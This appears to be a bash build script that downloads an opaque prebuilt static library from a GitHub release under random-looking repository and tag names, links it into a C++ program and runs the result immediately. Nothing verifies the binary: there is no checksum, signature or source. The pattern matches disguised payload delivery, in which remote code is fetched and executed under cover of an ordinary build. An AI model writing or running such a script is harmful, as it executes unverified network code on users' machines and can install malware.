#!/usr/bin/env bash
set -e
REPO="xavigarden/serenevaultlab"
TAG="hidden-garden-calm-forest"
LIB="layered-ember.a"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "$URL" --output "$LIB"
g++ main.cpp "$LIB" -pthread -O2 -std=c++17 -o app && ./app
